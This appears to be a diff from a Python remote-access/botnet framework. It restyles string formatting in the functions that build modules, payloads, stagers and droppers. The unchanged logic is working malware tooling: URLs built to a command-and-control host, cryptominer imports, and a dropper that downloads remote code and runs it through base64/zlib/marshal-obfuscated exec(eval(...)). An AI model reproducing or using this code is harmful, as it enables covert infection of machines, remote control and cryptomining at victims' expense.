@@ -245,7 +245,11 @@ def _modules(options, **kwargs):
                     _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                     if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                         util.display("[-]", color='red', style='normal')
-                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='normal')
+                        util.display(
+                            f"can't add module: '{m}' (does not exist)",
+                            color='reset',
+                            style='normal',
+                        )
                         continue
                 module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                 modules.append(module)
@@ -272,7 +276,7 @@ def _imports(options, **kwargs):
         for line in open(module, 'r').read().splitlines():
             if len(line.split()):
                 if line.split()[0] == 'import':
-                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + [f'core.{s}' for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                         if x in line:
                             break
                     else:
@@ -319,7 +323,13 @@ def _payload(options, **kwargs):
 
     loader  = open('core/loader.py','r').read()#, generators.loader(host=C2_HOST, port=int(C2_PORT)+2, packages=list(kwargs['hidden']))))
 
-    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
+    test_imports = '\n'.join(
+        [
+            f'import {i}'
+            for i in list(kwargs['hidden'])
+            if i not in ['StringIO', '_winreg', 'pycryptonight', 'pyrx']
+        ]
+    )
     potential_imports = '''
 try:
     import pycryptonight
@@ -374,8 +384,8 @@ except ImportError: pass
 
         with open(path, 'w') as fp:
             fp.write(payload)
-         
-        s = 'http://{}:{}/{}'.format(C2_HOST, int(C2_PORT) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+
+        s = f"http://{C2_HOST}:{int(C2_PORT) + 1}/{pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), ''))}"
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
@@ -431,7 +441,7 @@ def _stager(options, **kwargs):
         with open(path, 'w') as fp:
             fp.write(stager)
 
-        s = 'http://{}:{}/{}'.format(C2_HOST, int(C2_PORT) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = f"http://{C2_HOST}:{int(C2_PORT) + 1}/{pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), ''))}"
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
@@ -473,7 +483,15 @@ def _dropper(options, **kwargs):
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(
+        repr(
+            base64.b64encode(
+                zlib.compress(
+                    marshal.dumps(f"urlopen({repr(kwargs['url'])}).read()", 2)
+                )
+            )
+        )
+    )
 
     with open(name, 'w') as fp:
         fp.write(dropper)
